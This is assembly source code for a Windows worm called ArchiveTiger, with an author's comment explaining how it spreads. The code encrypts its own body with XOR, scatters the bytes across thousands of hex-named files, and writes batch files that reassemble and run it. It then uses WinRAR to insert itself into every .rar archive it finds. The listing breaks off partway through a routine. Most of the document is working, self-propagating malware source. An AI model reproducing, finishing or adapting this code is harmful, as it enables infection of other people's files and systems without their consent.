######################################[ArchiveTiger.ASM]######################################
#  ArchiveTiger
#  by Second Part To Hell
#  www.spth.de.vu
#  spth@priest.com
#  idead since summer 2005
#  written in April-May 2006
#
#  This is probably the most complex and morphic malware I've ever written.
#  It uses two techniques, which I've explained in rRlf#6 (Over-File-Splitting
#  and Code in Filename), but even more advanced.
#
#  The worm arrives as .RAR file. When the user uncompress and run the start.bat
#  file the worm starts.
#  - First it combines all .tmp files to one .exe file. This works via function
#    'copy'. The start.bat may look like this:
#
#    - - -
#    cd ipnimpvf
#    copy enxk.tmp+af.tmp+gmst.tmp+ztlobb.tmp+bibxwf.tmp /b nqfaoj.exe
#    hjfsgnl.bat
#    - - -
#
#    First it chances the directory to the worm-dir. Then it copies the first
#    .tmp files to a .exe file and calls another .bat files, which continues:
#
#    - - -
#    copy nqfaoj.exe+k.tmp+xxon.tmp+jnq.tmp+fjpz.tmp+uxvhm.tmp+osoprk.tmp+m.tmp+acoq.tmp /b rllv.exe
#    copy rllv.exe+xvkepmd.tmp+hg.tmp+bwnlu.tmp+nfvvjv.tmp+toslwjr.tmp+cynivedi.tmp+xxp.tmp+lxssucpv.tmp /b zplgrltq.exe
#    m.bat
#    - - -
#
#    This will be continued until the whole first .exe file is generated. The
#    generated .exe file will be executed then.
#
#  - The second file (let's call it dechiff.exe for easier explanation - it has
#    a random name) searchs for files from .000 - .ZZZ and copies all filenames
#    (without extention) to the memory. When the last file (may not be .ZZZ, at
#    my test now it is .35K) the memory will be converted to binary - why?
#    All filenames are 1-4 HEX numbers, which means that every filename contains
#    1-4 bytes of the real worm.
#
#  - When dechiff.exe has converted all hex to binary, it searchs for *.txt.
#    In this .txt file a XOR decryption key is saved, which is about
#    10 byte - 20k byte dechiff.exe reads the content and decrypt the memory.
#
#  - The new filecontent is complete and decrypt, and will be written to file
#    called NRK.exe, which will be executed then. NRK.exe is the real worm file.
#
#  Now the real worm starts:
#
#  - The worm first generate a temporary copy of itself, and prepares everything
#    (VirtualAllocs, temp directory, ect)
#
#  - It generates a .txt file with random content. This could be 10byte-20k byte
#    (recursive ending)
#
#  - It encryptes the code of it's temporary copy with XOR - key=.txt file
#
#  - It starts to generate the files, which represents it's own code. The files'
#    numbering is the extention. The filename is a hex-number (1-4 byte).
#    For instance: EB2B.000 <- This is the MZ-sign of the .exe header (crypted).
#
#  - When the own file is changed to encrypted HEX-numbers in filenames, the
#    worm starts to split the code of the dechiff.exe file (which is saved in
#    the body of the worm). While splitting, the worm generates several combine
#    .bat files - one of it is called start.bat. start.bat is outside of the
#    worm-directory (with all other files), and will start the whole process.
#    The splitted files are (3..10) bytes.
#
#  - When the dechiff.exe and all combine files are finished, the spreading part
#    starts. The worm searchs for *.RAR files in the current directory (most
#    times the worm-directory) and in parent directory (directory of start.bat).
#
#  - At infection, the worm generates two WinRAR strings:
#    %ProgramFilesDir% (read from registry) + "\WinRAR\rar.exe a -y " + victim directory + victim name + "start.bat"
#    %ProgramFilesDir% (read from registry) + "\WinRAR\rar.exe a -y " + victim directory + victim name + worm-directory-name
#
#  - In the end, this strings will be executed via CreateProcess.
#
#
#  The worm does not spread when WinRAR is not installed on the computer.
#  At my tests, the worm-directory contains ~3.800-4.700 files. :)
#  About 91% of the files are HEX-files. ~9% are .tmp (splitted dechiff.exe)
#  The rest (~5-20 files) are .bat (combining dechiff.exe).
#  And one .txt file: KEY for decrypting the worm.
#
#  
#  I know, this all is highly unusual - but where is the fun of doing usual things? :)
#
#
######################################[ArchiveTiger.ASM]######################################
include '..\FASM\INCLUDE\win32ax.inc'

	primary_decryption_code_length	EQU primary_decryption_code_end-primary_decryption_code
	inf_string_length1		EQU end_inf_str-inf_str

.data
	memory_alloc	dd 0x0
	my_filename	dd 0x0
	hCreFile	dd 0x0
	new_filesize	dd 0x0
	hCrFiMap	dd 0x0
	hMapView	dd 0x0
	hCrypTxt	dd 0x0

	keysize 	dd 0x0

	trash_counter	dd 0x0

	bin2hex:
	bin2hex_1	db 0x0
	bin2hex_2	db 0x0
			db 0x0
	rnd_split_combine_buffer: times 12 db 0x0

	rand_name_buffer: times 8 db 0x0
	rnd_file_name:	  times 9 db 0x0
				  db 'txt',0x0

	new_filename:	  times 8 db 0x0
	    exe_ext:		  db '.exe',0x0

	hex_filename:	  times 8 db 0x0	; 8 Bytes Filename
				  db '.'	; '.'
	hex_extention:		  db '000'	; 3 Bytes Extention
	   zero_field:		  db 0x0	; 0-terminated String

	FALSE_F 	dd 0x0
	dotdot		db '..',0x0

	c_file_size	dd 0x0

	combine_name_size	db 0x0
	combine_name_size2	db 0x0
	combine_name		db 'start.bat', 0x0
	combine_data		dd 0x0
	combine_pointer 	dd 0x0
	combine_start		db 'copy '
	combine_b_space 	db ' '
	combine_b		db '/b'
	combine_space		db ' '
	combine_handle		dd 0x0

	split_handle		dd 0x0
	split_counter		db 0x0

	combine_cd		db 'cd '
	worm_dir:	times 8 db 0x0
	end_combine_cd		db 0x0D,0x0A
	GetCurrentDir_buffer:	times 255 db 0x0
	GetCDB_Size		dd 0x0
	program_dir_reg_subkey	db 'SOFTWARE\Microsoft\Windows\CurrentVersion',0x0
	program_dir_reg_value	db 'ProgramFilesDir',0x0
	reg_handle		dd 0x0
	reg_value_type		dd 0x0
	reg_buffer_size 	dd 0x25
	reg_buffer:  times 0x25 db 0x0			; Program-Dir-Buffer
		     times 21	db 0x0			; WinRAR-String-Buffer
	GCD:	     times 255	db 0x0			; Current-Directory-Buffer

	infection_extention	db '*.rar',0x0
	inf_handle		dd 0x0
	inf_str 		db '\WinRAR\rar.exe a -y '
	inf_string_length	dd 0x0
	end_inf_str:
	save_inf_str_pointer	dd 0x0

WIN32_FIND_DATA:
  .dwFileAttributes   dd ?
  .ftCreationTime     FILETIME
  .ftLastAccessTime   FILETIME
  .ftLastWriteTime    FILETIME
  .nFileSizeHigh      dd ?
  .nFileSizeLow       dd ?
  .dwReserved0	      dd ?
  .dwReserved1	      dd ?
  .cFileName	      rb 260
  .cAlternateFileName rb 14
; end WIN32_FIND_DATA

STARTUPINFO_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0
; end STARTUPINFO

PROCESS_INFORMATION_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0
; end PROCESS_INFORMATION

systemtime_struct:	       ; for random number
	  dw 0		       ; wYear
	  dw 0		       ; wMonth
	  dw 0		       ; wDayOfWeek
	  dw 0		       ; wDay
	  dw 0		       ; wHour
	  dw 0		       ; wMinute
	  dw 0		       ; wSecond
rnd:	  dw 0		       ; wMilliseconds

	; Now the code of dechiff.exe follows:
	include 'prime_decrypt_bin.inc'


.code
 start:
	invoke	GetCommandLine		; Get the name of the running file
	inc	eax

	mov	[my_filename], eax	; Save the filename

   get_my_name:
	inc	eax
	cmp	byte [eax], '.'
   jne	get_my_name
	add	eax, 4
	mov	byte [eax], 0x0

	invoke	MessageBox, 0x0, "Eppur si muove! - Defend your opinion!", "Artwork by Second Part To Hell/rRlf", 0x0

	call	random_name			; Generate a random name
	mov	ecx, 8
	mov	esi, rnd_file_name
	mov	edi, new_filename
	rep	movsb				; Write the random name to 'new_filename'

	invoke	CopyFile, \			; Copy the own file, as access is denied while running
		[my_filename], \
		new_filename, \ 		; random name
		FALSE
	invoke	CreateFile, \			; Get the handle of the file
		new_filename, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCreFile], eax

	invoke	GetFileSize, \			; Get the Filesize of the file
		[hCreFile], \
		new_filesize
	mov	[new_filesize], eax
	mov	[c_file_size], primary_decryption_code_length



	invoke	CreateFileMapping, \		; Create a Map of the File
		[hCreFile], \
		0x0, \
		PAGE_READWRITE, \
		0x0, \
		[new_filesize], \
		0x0
	mov	[hCrFiMap], eax

	invoke	MapViewOfFile, \		; Create a MapViewOfFile
		[hCrFiMap], \
		FILE_MAP_ALL_ACCESS, \
		0x0, \
		0x0, \
		[new_filesize]
	mov	[hMapView], eax

	call	random_name
	mov	byte [rnd_file_name+8], 0x0

	invoke	CreateDirectory, \		; Current directory=Worm directory
		rnd_file_name, \
		0x0

	invoke	SetCurrentDirectory, \
		rnd_file_name

	mov	esi, rnd_file_name
	mov	edi, worm_dir
	mov	ecx, 0x8
	rep	movsb				; Save the name of the worm-directory

	mov	byte [rnd_file_name+8], '.'
	call	random_name
	invoke	CreateFile, \
		rnd_file_name, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCrypTxt], eax

	invoke	VirtualAlloc, \
		0x0, \
		0x10000, \		; 64 KB RAM
		0x1000, \
		0x4
	mov	[memory_alloc], eax

	push	0x0				; =pointer=0x0
	call	random_number

   generate_crypt_key:
	pop	eax
	push	eax
	call	random_number			; Generate 8 random numbers in rand_name_buffer
	mov	ecx, [rand_name_buffer+3]	; ecx=random dword
	and	ecx, 7				; ecx=00000000 00000000 00000000 00000???
	inc	ecx				; ecx!=0!
	cmp	ecx, 7				; ecx>8?
	jg	generate_crypt_key		; generate new random!
	mov	esi, rand_name_buffer		; From: rand_name_buffer
	mov	edi, [memory_alloc]		; To: memory
	pop	edx				; Get pointer
	add	edi, edx			; edi=memory_alloc+pointer
	add	edx, ecx			; Add number of written bytes to the counter
	push	edx				; Save pointer
	rep	movsb				; Write!
	call	random_number			; Get another random number

	xor	ebx,ebx
	mov	bx, word [rand_name_buffer+1]	; bx=???? ???? ???? ????
	add	bx, word [rand_name_buffer+3]
	add	bx, word [rand_name_buffer+5]
	cmp	ebx, 0x80
   jg  generate_crypt_key			; If not: Continue generating keys

	pop	eax				; Get KEY-size
	mov	[keysize], eax

	invoke	WriteFile, \			; Write the generated random code to the .txt file
		[hCrypTxt], \
		[memory_alloc], \
		[keysize], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \			; Close the .txt file
		[hCrypTxt]

	mov	ecx, [new_filesize]
   encrypt_map:
	mov	edx, [new_filesize]		; EDX=filesize
	sub	edx, ecx			; EDX=filesize-ECX(bytes to write)
	mov	eax, [memory_alloc]		; EAX=pointer to random code in memory
	add	eax, edx			; EAX=pointer to current rnd byte in memory
	mov	al, byte [eax]			; Cryptor-Byte in AL
	mov	ebx, [hMapView] 		; EBX=Pointer to MapView
	add	ebx, edx			; EBX=Pointer to current byte of MapView
	mov	ah, byte [ebx]			; Byte to be encrypted in AH
	xor	ah, al				; Encrypt!
	mov	ebx, [hMapView] 		; Pointer of Mapped File to ebx
	add	ebx, edx			; Get the -to-encrypt- byte
	mov	[ebx], ah			; Move the encrypted Byte to Memory
   loop encrypt_map


	xor	ecx, ecx			; ECX=counter=0
   write_hex_to_memory:
	add	ecx, [hMapView]
	mov	al, byte [ecx]			; One Byte of Mapview to al
	sub	ecx, [hMapView]
	call	binary_to_hex			; Convert binary al to hex valie (AX)
	mov	ebx, ecx			; EBX=counter
	shl	ebx, 1				; EBX*=2
	add	ebx, [memory_alloc]
	mov	word [ebx], ax			; Write HEX-Value
	inc	ecx				; Increase the counter
	cmp	ecx, [new_filesize]		; ECX=filesize?
   jne	write_hex_to_memory			; If yes, stop writing



	mov	ecx, [new_filesize]		; ecx=filesize
	shl	ecx, 1				; ecx*=2 = Size of byte to write (the HEX-values)
	mov	[trash_counter], ecx		; trash_counter=counter
   generate_hex_files:
	mov	eax, [trash_counter]		; If trash_counter < 0x8  -> AL=trash_counter
	cmp	[trash_counter], 0x8		; Compare if trash_counter <=8
	jle	make_last_hex_file		; If so, goto end of writing
	call	random_name
	call	random_byte			; al=random number
	xor	al, byte [rand_name_buffer]
	xor	al, byte [rand_name_buffer+2]
	xor	al, byte [rand_name_buffer+4]
	xor	al, byte [trash_counter]
	and	eax, 0x7			; al=0000 0???
	inc	al				; At least 0x1
	mov	ebx, [new_filesize]		; EBX=Filesize
	shl	ebx, 1				; EBX=Bytes to write
	sub	ebx, [trash_counter]		; EBX=Already written bytes
	sub	[trash_counter], eax		; Decrease the bytes to write by the bytes which will be written
						; Dumb Info: The last 2 lines costed me ~1.5h of bug-searching :))
	add	ebx, [memory_alloc]		; EBX=Pointer where to start to write
	call	Create_Hex_File 		; Create the file now
   jmp	generate_hex_files

make_last_hex_file:
	mov	ebx, [new_filesize]
	shl	ebx, 1
	sub	ebx, [trash_counter]
	add	ebx, [memory_alloc]
	call	Create_Hex_File 		; Now all files have been written

	invoke	UnmapViewOfFile, \
		[hMapView]

	invoke	CloseHandle, \
		[hCrFiMap]

	invoke	CloseHandle, \			; Close File
		[hCreFile]

	mov	ecx, primary_decryption_code_length
	mov	esi, primary_decryption_code
	mov	edi, [memory_alloc]
	rep	movsb

	mov	eax, rnd_file_name		; RND-pointer in eax
	add	eax, 8				; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.tmp'		; instate of '.tmp', '.exe'

	invoke	VirtualAlloc, \ 		; Reserve Space in Memory
		0x0, \
		0x120000, \
		0x1000, \
		0x4

	mov	[combine_data], eax				; Save the pointer to it.
	mov	[combine_pointer], eax				; Save again

	invoke	SetCurrentDirectory, \				; Create the start.bat outside of the directory
		dotdot

	invoke	CreateFile, \					; Create start.bat file
		combine_name, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_NEW, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	mov	[combine_handle], eax

	mov	esi, combine_cd
	mov	edi, [combine_pointer]
	mov	ecx, 13
	rep	movsb					; Write 'cd randfolder'\n

	add	[combine_pointer], 13

	mov	byte [end_combine_cd], 0x0

	invoke	SetCurrentDirectory, \
		worm_dir

	mov	ebp, 0xABA9AB
	call	random_name

	mov	esi, combine_start				; What to write
	mov	edi, [combine_pointer]				; Where to write
	mov	ecx, 5						; How much to write
	rep	movsb						; Write!

	add	[combine_pointer], 5				; Get next empty byte to write

    OFS_main_loop:

	call	random_number
	mov	al, [combine_name_size]
	xor	al, byte [rand_name_buffer]
	add	al, byte [rand_name_buffer+5]
	sub	al, byte [rand_name_buffer+2]
	xor	al, byte [rand_name_buffer+4]
	xor	al, byte [rand_name_buffer+1]
	xor	al, byte [rand_name_buffer+3]
	and	al, 0x07					; AL < 7
	mov	[combine_name_size], al

	mov	ebp, 0xAAAAAAAA 				; Influences the random engine
	call	random_name					; random name in rnd_file_name

	xor	eax, eax					; EAX=0
	add	al, [combine_name_size] 			; EAX=(0..7)
	add	eax, rnd_file_name				; EAX=rnd_file_name+(0..7)

	invoke	CreateFile, \
		eax, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_NEW, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	cmp	eax, INVALID_HANDLE_VALUE			; If file already existed
	je	OFS_main_loop					; then get a new file-name


	mov	[split_handle], eax			; Save the file-handle

	call	random_number				; Get random number
	xor	eax, eax				; eax=0
	mov	al, [rand_name_buffer]			; al~=random
	and	al, 7					; al= 0000 0???
	add	al, 3					; At least three byte
	mov	[split_counter], al			; Save that bytes

	sub	[c_file_size], eax			; Decrease the bytes to write

	invoke	WriteFile, \				; Write (1..8) byte
		[split_handle], \
		[memory_alloc], \
		eax, \
		FALSE_F, \
		0x0

	invoke	CloseHandle, [split_handle]		; Close the file

	xor	eax, eax
	mov	al, [split_counter]			; How many bytes written
	add	[memory_alloc], eax			; Add the pointer - write the next few bytes next time


	mov	esi, rnd_file_name			; From: Filename-buffer
	xor	eax, eax
	add	al, [combine_name_size] 		; EAX=(0..7)
	add	esi, eax				; ESI=Pointer to rnd-name+(0..7)
	mov	edi, [combine_pointer]			; To: compainer-pointer
	mov	ecx, 12 				; 8+strlen('.xxx')
	sub	ecx, eax				; ECX=(0..7)+strlen('.xxx')
	rep	movsb					; Write!

	add	[combine_pointer], 12			; Add 12 to pointer
	sub	[combine_pointer], eax			; Subtract (0..7)

	mov	eax, [combine_pointer]			; Pointer to eax

	mov	byte [eax], '+' 			; Move '+' to the code's memory
	inc	[combine_pointer]			; Increase the pointer

	xor	ebx, ebx
	mov	bx, word [rand_name_buffer+1]		; bx=???? ???? ???? ????
	xor	bx, word [rand_name_buffer+3]
	add	bx, word [rand_name_buffer+5]
	add	bx, word [rand_name_buffer+3]
	cmp	ebx, 0x2FFF
	jg	OFS_cmp_end

	call	combine_next_line			; New line in combine-file

   OFS_cmp_end:

	cmp	[c_file_size], 0x0			; Compare if more bytes to write
    jg	OFS_main_loop					; If yes, jmp to main_loop

	mov	eax, [combine_pointer]		; eax=pointer
	dec	eax				; Delete the last '+'
	mov	byte [eax], 0x20		; Add a space



	mov	esi, combine_b					; What to write
	mov	edi, [combine_pointer]				; Where to write
	mov	ecx, 3						; How much to write
	rep	movsb						; Write!

	add	[combine_pointer], 4				; Get next empty byte to write

	mov	ebp, 0xAAAAAAAA 		; Influences the random engine
	call	random_number			; random name in rnd_file_name

	mov	eax, rnd_file_name		; RND-pointer in eax
	add	eax, 8				; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.exe'		; instate of '.tmp', '.exe'

	dec	[combine_pointer]
	mov	esi, rnd_file_name		; From: rnd_file_name
	mov	edi, [combine_pointer]		; To: compainter_pointer
	mov	ecx, 12 			; How much: 12 bytes
	rep	movsb				; Write

	add	[combine_pointer], 12		; Add 12, to get the end again

	mov	eax, [combine_pointer]		; eax=pointer to content
	mov	word [eax], 0x0A0D		; Next Line
	add	[combine_pointer], 2

	mov	esi, rnd_file_name		; From: rnd_file_name
	mov	edi, [combine_pointer]		; To: compainter_pointer
	mov	ecx, 12 			; How much: 12 bytes
	rep	movsb				; Write

	add	[combine_pointer], 12		; Add 12, to get the end again

	mov	eax, [combine_data]
	sub	[combine_pointer], eax

	invoke	WriteFile, \			; Write the last .bat file
		[combine_handle], \
		[combine_data], \
		[combine_pointer], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \			; Close the last .bat file
		[combine_handle]

	invoke	SetCurrentDirectory, \		; Out of the worm-directory
		dotdot

	invoke	DeleteFile, \			; Delete the temporariely copy of the worm file
		new_filename

	invoke	RegOpenKeyEx, \ 		; Open the reg-key for getting the ProgramDir-Path
		HKEY_LOCAL_MACHINE, \
		program_dir_reg_subkey, \
		0x0, \
		KEY_ALL_ACCESS, \
		reg_handle

	invoke	RegQueryValueEx, \		; Read the info
		[reg_handle], \
		program_dir_reg_value, \
		0x0, \
		reg_value_type, \
		reg_buffer, \
		reg_buffer_size

	invoke	RegCloseKey, \					; Close reg-key
		[reg_handle]

	xor	ecx, ecx
    find_end_zero_loop: 					; Find the end of the value-string
	mov	eax, reg_buffer
	add	eax, ecx
	inc	ecx
	cmp	byte [eax], 0x0 				; If zero=END
    jne find_end_zero_loop

	sub	eax, reg_buffer

	mov	esi, inf_str
	mov	edi, reg_buffer
	add	edi, eax
	mov	ecx, inf_string_length1
	rep	movsb						; Append the WinRAR-string to the %ProgramFilesDir%

	add	eax, inf_string_length1
	dec	eax
	mov	[inf_string_length], eax

	invoke	GetCurrentDirectory, \
		0x100, \
		GetCurrentDir_buffer

	xor	ecx, ecx
    find_GCD_zero_loop: 					; Find the end of the Current-Dir-string
	mov	eax, GetCurrentDir_buffer
	add	eax, ecx
	inc	ecx
	cmp	byte [eax], 0x0 				; If zero=END
    jne find_GCD_zero_loop

	sub	eax, GetCurrentDir_buffer
	mov	[GetCDB_Size], eax

	mov	esi, GetCurrentDir_buffer
	mov	edi, GCD
	mov	ecx, [GetCDB_Size]
	rep	movsb						; Write a temp GetCurDir-String

	call	Find_RAR_Files_And_Infect			; Call the Infection Functions

	invoke	SetCurrentDirectory, \				; The worm-file is generated in the worm-directory
		dotdot						; (hardly any .RARs)so we should go out, infect other dirs

	call	ChangeDirString 				; Change the path of the current directory

	call	Find_RAR_Files_And_Infect			; And infect!

	invoke	ExitProcess, 0x0

Create_Hex_File:
; Generate a file with code (converted to HEX) in the filename
; In:  al  = Bytes of filename (without extention)
;      ebx = Pointer of filename-content
;
; Anything changed!

	mov	dword [hex_filename+0], 0x0
	mov	dword [hex_filename+4], 0x0

	xor	ecx, ecx		; ECX=0
	mov	cl, al			; ECX=bytes of filename
	mov	esi, ebx		; ESI=Source=Pointer filename-content
	mov	al, 0x8 		; Maximal filesize
	sub	al, cl			; MAX-REAL=DIF
	and	eax, 0xFF		; eax= 0000 00FF
	mov	edi, hex_filename	; EDI=Destination=Buffer for filename
	add	edi, eax		; Real place to write
	rep	movsb			; Write

	add	eax, hex_filename

	invoke	CreateFile, \
		eax, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	invoke	CloseHandle, \
		eax

	mov	eax, hex_extention+2	; Pointer to 3rd byte in extention
	cmp	byte [eax], '9' 	; Is it '9'?
	je	hex_ext_counter_9_A	; If yes, make a 'A'

	cmp	byte [eax], 'Z' 	; Is it 'Z'?
	je	hex_ext_counter_Z_0

	inc	byte [eax]		; Increase extention-counter
ret

hex_ext_counter_9_A:
; In:  eax = Pointer to byte to change
; Out: [eax]='A'

	mov	byte [eax], 'A' 	; Increase extention-counter
ret


hex_ext_counter_Z_0:			; My first recursive function in asm :)
	mov	byte [eax], '0' 	; Increase extention-counter
	dec	eax
	cmp	byte [eax], '9'
	je	hex_ext_counter_9_A

	cmp	byte [eax], 'Z'
	je	hex_ext_counter_Z_0

	inc	byte [eax]
ret


binary_to_hex:
; Convert a binary byte to a hex-number
; In:  al = binary byte
; Out: ax = hex-value
; Nothing else changed

	mov	word [bin2hex], 0x3030		; Code of "00"
	mov	ah, al				; ah=al
	and	al, 0x0F			; al=0000 ????

	push	binary_to_hex_RJ_1		; Offset of return jmp to stack

	cmp	al, 0x0A			; Is al > 10
	jge	bin2hex_inc_al			; If yes, increase AL:
						; ASCII '0' = 0x30
						; ASCII '9' = 0x39
						; ASCII 'A' = 0x41
						; 'A'-'9' = 0x41-0x39 = 8-1 = 7

	mov	[trash_counter], ebx		 ; We did not need the retrun value
	pop	ebx				 ; Get it back
	mov	ebx, [trash_counter]		 ; Restore ebx

   binary_to_hex_RJ_1:
	add	byte [bin2hex_2], al		; '0'+al

	shr	ah, 4				; ah = ???? ---- -> 0000 ????
	mov	al, ah				; al = ah

	push	binary_to_hex_RJ_2

	cmp	al, 0x0A
	jge	bin2hex_inc_al

	mov	[trash_counter], ebx
	pop	ebx
	mov	ebx, [trash_counter]
   binary_to_hex_RJ_2:
	add	byte [bin2hex_1], al

	mov	ax, word [bin2hex]		; HEX-value to ax
ret


bin2hex_inc_al:
	add	al, 7				; al += 7  <- If al > "9" then ASCII-number + 7
ret



random_number:
	pop	edi				; Get value of stack
	push	edi				; Back to the stack
	mov	ecx, 8				; ecx=counter
	mov	dh, 0xAA			; dh: changes in the function and makes the number little bit more random
	mov	dl, 0x87			; same as dh
   random_name_loop:
	push	dx				; Save dx at stack
	push	ecx				; Save counter at stack
	call	random_byte			; Random number in al
	pop	ecx				; get counter
	xor	al, cl				; Counter influences pseudo random number
	pop	dx				; Get dx
	push	ecx
	xor	dx, cx				; Counter influences influncing number
	add	dh, al				; Random number influences influencing number
	sub	dl, al				; Same as dh
	neg	dl				; Neg dl
	xor	dl, dh				; dl XOR dh -> more variability
	xor	al, dl				; random number changes
	sub	ax, di				; value of stack influences random number
	add	ax, dx				; ax+dx
	mov	dl, [rand_name_buffer+ecx-2]
	mov	dh, byte [rand_name_buffer+ecx-3]    ; dx=???? ???? ????? ?????
	sub	al, dl				; al-=dl
	add	al, dh				; al+=dh
	mov	ah, dl				; ah=dl
	push	ax				; AX to stack
	mov	cl, 1				; cl=1
	or	dh, cl				; dh is at least 1 (to reduce chance of result=zero)
	mul	dh				; AL=AX*DH
	pop	cx				; CX=old AX
	push	cx				; To stack again
	add	cl, al				; CL+=AL
	sub	cl, ah				; CL-=AH
	xchg	al, cl				; AL=CL
	mov	cx, bp				; cx=bp
	mul	cl				; AX=AL*CL
	neg	ah				; NEG AH
	xor	al, ah				; xor AL and AH
	pop	cx				; get old AX
	sub	cl, al				; SUB
	add	cl, dl				; cl+=old random number
	sub	al, cl				; al ~=random :)
	pop	ecx				; Get counter
	mov	byte [rand_name_buffer+ecx-1], al    ; Save random letter
   loop random_name_loop
ret



random_name:
	call	random_number			; Get 8 random bytes
	mov	ecx, 8				; counter=8, as we want to do it 8 times

   changetoletter:
	mov	al, byte [rand_name_buffer+ecx-1]    ; Get a letter
	mov	bl, 10				; BL=10
	xor	ah, ah				; AX: 0000 0000 ???? ????
	div	bl				; AL=rnd/10=number between 0 and 25
	add	al, 97				; Add 97 for getting lowercase letters
	mov	[rnd_file_name+ecx-1], al	; Save random letter
   loop changetoletter
ret

random_byte:
	invoke	GetSystemTime, systemtime_struct	; Get first number
	mov	ebx, [rnd-2]				; ebx=number
	add	ebx, edx				; Making it pseudo-independent of time
	sub	ebx, ecx
	xor	ebx, eax
	xchg	bl, bh
	pop	ecx
	push	ecx
	neg	ebx
	xor	ebx, ecx				; ebx=pseudo-indepentend number

	invoke	GetTickCount				; Get second number
	xor	eax, ecx				; eax=number
	neg	ax					; Making it pseudo-independent of time
	xor	eax, edx
	xor	ah, al
	sub	eax, ebp
	add	eax, esi				; eax=pseudo-indepentend number

	xor	eax, ebx				; Compain the numbers -> eax
	mov	ebx, eax				; Save eax
	shr	eax, 8					; e-part -> ax
	xor	ax, bx
	xor	al, ah					; al=number
ret

combine_next_line:
	mov	eax, [combine_pointer]				; eax=pointer
	dec	eax						; Delete the last '+'
	mov	byte [eax], 0x20				; Add a space
	inc	[combine_pointer]				; Increase pointer again

	mov	ebp, 0xAAAAAAAA 				; Influences the random engine
	call	random_name					; random name in rnd_file_name

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.exe'				; instate of '.tmp', '.exe'

	dec	[combine_pointer]

	mov	esi, combine_b					; copy [source] /b [destination]
	mov	edi, [combine_pointer]
	mov	ecx, 3
	rep	movsb

	add	[combine_pointer], 3

	mov	esi, rnd_file_name				; From: rnd_file_name
	xor	eax, eax
	mov	al, [combine_name_size]
	add	esi, eax					; ESI=Pointer to RND-Name+(0..7)
	mov	edi, [combine_pointer]				; To: compainter_pointer
	mov	ecx, 12
	sub	ecx, eax
	rep	movsb						; Write

	add	[combine_pointer], 12				; Add 12, to get the end again
	xor	eax, eax
	mov	al, [combine_name_size]
	sub	[combine_pointer], eax

	mov	eax, [combine_pointer]				; eax=pointer to content
	mov	word [eax], 0x0A0D				; Next Line
	add	[combine_pointer], 2

	call	random_number
	and	byte [rand_name_buffer+4], 0x03 		; rand_name_buffer+4 < 4
	cmp	byte [rand_name_buffer+4], 0x00 		; rand_name_buffer+4 = 0 ?
	je	combine_file_split				; If yes, close current combine file,
								; make a new one,
								; call it and continue

	mov	esi, combine_start				; What to write
	mov	edi, [combine_pointer]				; Where to write
	mov	ecx, 5						; How much to write
	rep	movsb						; Write!

	add	[combine_pointer], 5				; Get next empty byte to write

	mov	esi, rnd_file_name				; From: rnd_file_name
	xor	eax, eax
	mov	al, [combine_name_size]
	add	esi, eax
	mov	edi, [combine_pointer]				; To: compainter_pointer
	mov	ecx, 12 					; How much: 12 bytes
	sub	ecx, eax
	rep	movsb

	add	[combine_pointer], 12
	sub	[combine_pointer], eax

	mov	eax, [combine_pointer]
	mov	byte [eax], '+'
	inc	[combine_pointer]

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.tmp'				; instate of '.tmp', '.exe'
ret


combine_file_split:
	mov	esi, rnd_file_name
	mov	edi, rnd_split_combine_buffer
	mov	ecx, 12
	rep	movsb						; Save last filename

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.bat'				; instate of '.bat', '.exe'


   CFS_loop:
	call	random_number
	mov	al, [combine_name_size]
	xor	al, byte [rand_name_buffer]
	add	al, byte [rand_name_buffer+5]
	sub	al, byte [rand_name_buffer+2]
	xor	al, byte [rand_name_buffer+4]
	xor	al, byte [rand_name_buffer+1]
	xor	al, byte [rand_name_buffer+3]
	and	al, 0x07					; AL < 7
	mov	[combine_name_size2], al

	call	random_name

	xor	eax, eax					; EAX=0
	add	al, [combine_name_size2]			; EAX=(0..7)
	add	eax, rnd_file_name				; EAX=rnd_file_name+(0..7)

	invoke	CreateFile, \					; Create the new .bat file
		eax, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_NEW, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	cmp	eax, INVALID_HANDLE_VALUE			; If file already existed
	je	CFS_loop

	push	eax						; Save the new file handle

	mov	esi, rnd_file_name
	xor	ebx, ebx
	mov	bl, [combine_name_size2]
	add	esi, ebx
